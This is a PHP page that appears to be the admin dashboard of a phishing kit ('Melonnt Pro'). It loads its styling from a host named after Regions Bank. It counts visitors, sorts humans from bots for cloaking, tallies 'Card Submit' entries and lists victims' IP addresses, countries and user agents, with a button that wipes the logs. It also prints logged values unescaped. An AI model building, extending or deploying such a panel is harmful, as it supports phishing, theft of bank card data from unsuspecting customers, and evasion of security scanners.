<?php
error_reporting(E_ALL);
session_start();

if (empty($_SESSION['token'])) {
    header("Location: ./");
    exit();
}

$config = json_decode(file_get_contents('../control.json'), true);

if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    if($_GET['reset'])
    {
        ob_start();
        $files = glob('../vtu_assetz/visitor_l0gz/*.txt');
        
        foreach ($files as $file) {
            if (is_file($file)) {
                if (unlink($file)) {
                    echo "Berhasil dihapus: $file<br />";
                } else {
                    echo "Gagal dihapus: $file<br />";
                }
            }
        }
        
        header("Location: ./");
        ob_end_flush();
    }
}

function hitungLine($data)
{
    $filePath = $data;
    
    if (file_exists($filePath)) {
        $file = fopen($filePath, 'r');
        $lineCount = 0;
        
        while (($line = fgets($file)) !== false) {
            if (trim($line) !== '') {
                $lineCount++;
            }
        }
    
        fclose($file);
        
        return $lineCount;
    } else {
        return 0;
    }
}

$filePath = '../vtu_assetz/visitor_l0gz/ips.txt';
if (file_exists($filePath)) {
    $lines = file($filePath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $lines = array_reverse($lines);
} else {
    $lines = null;
}

?>
<!doctype html>
<html lang="en" class="dark-theme">

<head>
  <!-- Required meta tags -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="icon" href="https://regionsbank-cb54d.web.app/admin/images/favicon-32x32.png" type="image/png" />
  <!--plugins-->
  <link href="https://regionsbank-cb54d.web.app/admin/plugins/vectormap/jquery-jvectormap-2.0.2.css" rel="stylesheet"/>
  <link href="https://regionsbank-cb54d.web.app/admin/plugins/simplebar/css/simplebar.css" rel="stylesheet" />
  <link href="https://regionsbank-cb54d.web.app/admin/plugins/perfect-scrollbar/css/perfect-scrollbar.css" rel="stylesheet" />
  <link href="https://regionsbank-cb54d.web.app/admin/plugins/metismenu/css/metisMenu.min.css" rel="stylesheet" />
  <!-- Bootstrap CSS -->
  <link href="https://regionsbank-cb54d.web.app/admin/css/bootstrap.min.css" rel="stylesheet" />
  <link href="https://regionsbank-cb54d.web.app/admin/css/bootstrap-extended.css" rel="stylesheet" />
  <link href="https://regionsbank-cb54d.web.app/admin/css/style.css" rel="stylesheet" />
  <link href="https://regionsbank-cb54d.web.app/admin/css/icons.css" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css">

  <!-- loader-->
  <link href="https://regionsbank-cb54d.web.app/admin/css/pace.min.css') }}" rel="stylesheet" />

  <!--Theme Styles-->
  <link href="https://regionsbank-cb54d.web.app/admin/css/dark-theme.css" rel="stylesheet" />
  <link href="https://regionsbank-cb54d.web.app/admin/css/light-theme.css" rel="stylesheet" />
  <link href="https://regionsbank-cb54d.web.app/admin/css/semi-dark.css" rel="stylesheet" />
  <link href="https://regionsbank-cb54d.web.app/admin/css/header-colors.css" rel="stylesheet" />

  <title>Melonnt Pro - Admin Dashboard</title>
</head>

<body>


  <!--start wrapper-->
  <div class="wrapper">
    <!--start top header-->
    <?= include("layout/header.php"); ?>
    <!--end top header-->

        <!--start sidebar -->
        <?= include("layout/sidebar.php"); ?>
        <!--end sidebar -->

       <!--start content-->
        <main class="page-content">
              
            
            
            <div class="row">
            
                <form class="mb-3 d-flex justify-content-end">
                    <input type="hidden" name="reset" value="true" />
                    <button class="btn btn-outline-primary">Reset All Logs</button>
                </form>
            
                <div class="col-md-3">
                    <div class="card overflow-hidden radius-10">
                        <div class="card-body">
                         <div class="d-flex align-items-stretch justify-content-between overflow-hidden">
                          <div class="w-50">
                            <p>All Visitor</p>
                            <h4 class=""><?= hitungLine('../vtu_assetz/visitor_l0gz/ips.txt'); ?></h4>
                          </div>
                        </div>
                      </div>
                    </div>
                </div>
                <div class="col-md-3">
                    <div class="card overflow-hidden radius-10">
                        <div class="card-body">
                         <div class="d-flex align-items-stretch justify-content-between overflow-hidden">
                          <div class="w-50">
                            <p>Total Human</p>
                            <h4 class=""><?= hitungLine('../vtu_assetz/visitor_l0gz/accepted.txt'); ?></h4>
                          </div>
                        </div>
                      </div>
                    </div>
                </div>
                <div class="col-md-3">
                    <div class="card overflow-hidden radius-10">
                        <div class="card-body">
                         <div class="d-flex align-items-stretch justify-content-between overflow-hidden">
                          <div class="w-50">
                            <p>Total Bots</p>
                            <h4 class=""><?= hitungLine('../vtu_assetz/visitor_l0gz/denied.txt'); ?></h4>
                          </div>
                        </div>
                      </div>
                    </div>
                </div>
                <div class="col-md-3">
                    <div class="card overflow-hidden radius-10">
                        <div class="card-body">
                         <div class="d-flex align-items-stretch justify-content-between overflow-hidden">
                          <div class="w-50">
                            <p>Card Submit</p>
                            <h4 class=""><?= hitungLine('../vtu_assetz/visitor_l0gz/card.txt'); ?></h4>
                          </div>
                        </div>
                      </div>
                    </div>
                </div>
            </div><!--end row-->
            
            <div class="row">
                <div class="col-md-12">
                    <div class="card">
                        <div class="card-header">Statics Visitor</div>
                        <div class="card-body">
                            <div class="table-responsive">
                                <table class="table align-middle mb-0">
                                    <thead>
                                        <tr>
                                            <th>Date & Time</th>
                                            <th>IP Address</th>
                                            <th>Country</th>
                                            <th>User Agent</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        
                                        <?php if (isset($lines) && is_array($lines) && count($lines) != 0): ?>
                                        
                                        <?php foreach($lines as $line): 
                                        
                                        $ex = explode('|', $line);
                                        
                                        ?>
                                        
                                        <tr>
                                            <td><?= $ex[0]; ?></td>
                                            <td><?= $ex[1]; ?></td>
                                            <td><?= $ex[2]; ?></td>
                                            <td><?= $ex[3]; ?></td>
                                        </tr>
                                        
                                        <?php endforeach; ?>
                                        
                                        <?php else: ?>
                                        
                                        <tr>
                                            <td colspan="10">Not available data.</td>
                                        </tr>
                                        
                                        <?php endif; ?>
            
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
        </main>
       <!--end page main-->

       <!--start overlay-->
        <div class="overlay nav-toggle-icon"></div>
       <!--end overlay-->


       <!--Start Back To Top Button-->
		     <a href="javaScript:;" class="back-to-top"><i class='bx bxs-up-arrow-alt'></i></a>
       <!--End Back To Top Button-->

       <!--start switcher-->
       <div class="switcher-body">
        <button class="btn btn-primary btn-switcher shadow-sm" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasScrolling" aria-controls="offcanvasScrolling"><i class="bi bi-paint-bucket me-0"></i></button>
        <div class="offcanvas offcanvas-end shadow border-start-0 p-2" data-bs-scroll="true" data-bs-backdrop="false" tabindex="-1" id="offcanvasScrolling">
          <div class="offcanvas-header border-bottom">
            <h5 class="offcanvas-title" id="offcanvasScrollingLabel">Theme Customizer</h5>
            <button type="button" class="btn-close text-reset" data-bs-dismiss="offcanvas"></button>
          </div>
          <div class="offcanvas-body">
            <h6 class="mb-0">Theme Variation</h6>
            <hr>
            <div class="form-check form-check-inline">
              <input class="form-check-input" type="radio" name="inlineRadioOptions" id="LightTheme" value="option1">
              <label class="form-check-label" for="LightTheme">Light</label>
            </div>
            <div class="form-check form-check-inline">
              <input class="form-check-input" type="radio" name="inlineRadioOptions" id="DarkTheme" value="option2">
              <label class="form-check-label" for="DarkTheme">Dark</label>
            </div>
            <div class="form-check form-check-inline">
              <input class="form-check-input" type="radio" name="inlineRadioOptions" id="SemiDarkTheme" value="option3">
              <label class="form-check-label" for="SemiDarkTheme">Semi Dark</label>
            </div>
            <hr>
            <div class="form-check form-check-inline">
              <input class="form-check-input" type="radio" name="inlineRadioOptions" id="MinimalTheme" value="option3" checked>
              <label class="form-check-label" for="MinimalTheme">Minimal Theme</label>
            </div>
            <hr/>
            <h6 class="mb-0">Header Colors</h6>
            <hr/>
            <div class="header-colors-indigators">
              <div class="row row-cols-auto g-3">
                <div class="col">
                  <div class="indigator headercolor1" id="headercolor1"></div>
                </div>
                <div class="col">
                  <div class="indigator headercolor2" id="headercolor2"></div>
                </div>
                <div class="col">
                  <div class="indigator headercolor3" id="headercolor3"></div>
                </div>
                <div class="col">
                  <div class="indigator headercolor4" id="headercolor4"></div>
                </div>
                <div class="col">
                  <div class="indigator headercolor5" id="headercolor5"></div>
                </div>
                <div class="col">
                  <div class="indigator headercolor6" id="headercolor6"></div>
                </div>
                <div class="col">
                  <div class="indigator headercolor7" id="headercolor7"></div>
                </div>
                <div class="col">
                  <div class="indigator headercolor8" id="headercolor8"></div>
                </div>
              </div>
            </div>
          </div>
        </div>
       </div>
       <!--end switcher-->

  </div>
  <!--end wrapper-->

  <script src="https://regionsbank-cb54d.web.app/admin/js/bootstrap.bundle.min.js"></script>
  <script src="https://regionsbank-cb54d.web.app/admin/js/jquery.min.js"></script>
  <script src="https://regionsbank-cb54d.web.app/admin/plugins/simplebar/js/simplebar.min.js"></script>
  <script src="https://regionsbank-cb54d.web.app/admin/plugins/metismenu/js/metisMenu.min.js"></script>
  <script src="https://regionsbank-cb54d.web.app/admin/plugins/perfect-scrollbar/js/perfect-scrollbar.js"></script>
  <script src="https://regionsbank-cb54d.web.app/admin/plugins/vectormap/jquery-jvectormap-2.0.2.min.js"></script>
  <script src="https://regionsbank-cb54d.web.app/admin/plugins/vectormap/jquery-jvectormap-world-mill-en.js"></script>
  <script src="https://regionsbank-cb54d.web.app/admin/js/pace.min.js"></script>
  <script src="https://regionsbank-cb54d.web.app/admin/plugins/chartjs/js/Chart.min.js"></script>
  <script src="https://regionsbank-cb54d.web.app/admin/plugins/chartjs/js/Chart.extension.js"></script>
  <script src="https://regionsbank-cb54d.web.app/admin/plugins/apexcharts-bundle/js/apexcharts.min.js"></script>
  <script src="https://regionsbank-cb54d.web.app/admin/js/app.js"></script>
  <script src="https://regionsbank-cb54d.web.app/admin/js/index.js"></script>


</body>

</html>